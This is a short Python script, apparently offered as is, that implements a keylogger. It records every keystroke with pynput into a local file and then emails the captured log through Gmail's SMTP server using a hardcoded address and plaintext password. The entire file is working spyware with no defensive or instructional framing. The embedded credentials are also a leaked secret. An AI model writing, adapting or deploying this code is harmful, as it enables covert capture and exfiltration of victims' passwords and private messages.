import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Email configuration
sender_email = 'silviaandiris@gmail.com'
sender_password = 'Qwerty2010!'
receiver_email = 'silviaandiris@gmail.com'

# Function to send email
def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
    except Exception as e:
        print(f'Failed to send email: {e}')

# Keylogger function
def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            with open('keylogs.txt', 'a') as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open('keylogs.txt', 'a') as f:
                f.write('\n')
        else:
            with open('keylogs.txt', 'a') as f:
                f.write(f'[{key}]')

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Send keylogs via email
with open('keylogs.txt', 'r') as f:
    keylogs = f.read()
send_email('Keylogger Data', keylogs)